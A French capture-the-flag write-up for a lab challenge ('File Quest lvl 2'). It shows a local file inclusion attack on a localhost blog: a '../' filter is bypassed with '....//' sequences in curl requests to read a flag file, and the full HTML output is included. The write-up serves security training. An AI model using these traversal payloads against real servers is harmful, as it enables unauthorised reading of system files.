# File Quest lvl 2

## Local File Inclusion
Dans ce chall nous avons mis un filtre, il interdit la suite suivante ``../``.

En faisant un curl à la même URL nous avons cette sortie : 
```` Bash
curl "http://localhost:5082/article.php?page=../../../../../../var/flag"                                                                                                                                                                     ─╯
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Article - ESGI Blog</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <div class="container">
            <h1>🎓 ESGI TECH BLOG</h1>
            <p class="subtitle"><a href="index.php" style="color: white;">← Retour à l'accueil</a></p>
        </div>
    </header>

    <main class="container">
        <article class="article-content">
            <p class='error'>🚫 Caractères non autorisés détectés !</p
````
Nous pouvons clairement voir que la suite de caractère ``../`` est interdite. il faut Bypass cette interdiction. 

La méthode la plus simple est de la remplacer par ``....//``. Voici le résultat avec le Bypass : 
``` Bash
curl "http://localhost:5082/article.php?page=....//....//....//....//var//flag"                                                                                                                                                              ─╯
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Article - ESGI Blog</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <div class="container">
            <h1>🎓 ESGI TECH BLOG</h1>
            <p class="subtitle"><a href="index.php" style="color: white;">← Retour à l'accueil</a></p>
        </div>
    </header>

    <main class="container">
        <article class="article-content">
            <div class='article-text'>SKL{L0c4L_F1L3_1nCLu5i0n_-_}<br />
<br />
</div>        </article>
    </main>
</body>
</html>
```

